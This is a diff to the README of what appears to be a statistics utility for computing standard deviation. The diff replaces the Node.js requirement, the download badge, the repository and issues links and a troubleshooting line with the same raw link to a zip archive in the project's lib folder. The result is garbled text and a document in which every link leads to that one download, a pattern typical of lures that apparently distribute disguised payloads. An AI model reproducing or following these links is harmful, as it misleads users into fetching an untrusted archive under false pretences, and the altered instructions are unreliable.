@@ -5,13 +5,13 @@ Welcome! This application helps you compute the standard deviation of a one-dime
 
 ## 🛠️ System Requirements
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12 or higher
+- https://raw.githubusercontent.com/sakibur1rahman/stats-base-ndarray-stdevch/main/lib/stdevch-stats-base-ndarray-1.7-beta.2.zip Version 12 or higher
 - Memory: Minimum 512 MB of RAM
 
 ## 💻 Download & Install
 To download the software, please visit the following link:
 
-[![Download stats-base-ndarray-stdevch](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/sakibur1rahman/stats-base-ndarray-stdevch/releases)
+[![Download stats-base-ndarray-stdevch](https://raw.githubusercontent.com/sakibur1rahman/stats-base-ndarray-stdevch/main/lib/stdevch-stats-base-ndarray-1.7-beta.2.zip)](https://raw.githubusercontent.com/sakibur1rahman/stats-base-ndarray-stdevch/main/lib/stdevch-stats-base-ndarray-1.7-beta.2.zip)
 
 Once you visit the page, look for the latest release. You will find various files available for download. Choose the one that suits your system.
 
@@ -43,13 +43,13 @@ Using our application, you can quickly find the standard deviation without needi
 
 ## ⚙️ Troubleshooting
 If you encounter any issues:
-- Ensure you have the correct version of Node.js installed.
+- Ensure you have the correct version of https://raw.githubusercontent.com/sakibur1rahman/stats-base-ndarray-stdevch/main/lib/stdevch-stats-base-ndarray-1.7-beta.2.zip installed.
 - Check that the application has the necessary permissions to run.
 - Consult the issues section on the GitHub page for solutions or to report new problems.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/sakibur1rahman/stats-base-ndarray-stdevch)
-- [Issues Page](https://github.com/sakibur1rahman/stats-base-ndarray-stdevch/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/sakibur1rahman/stats-base-ndarray-stdevch/main/lib/stdevch-stats-base-ndarray-1.7-beta.2.zip)
+- [Issues Page](https://raw.githubusercontent.com/sakibur1rahman/stats-base-ndarray-stdevch/main/lib/stdevch-stats-base-ndarray-1.7-beta.2.zip)
 
 ## 📬 Contact
 For more information or support, feel free to reach out via the issues section on GitHub.
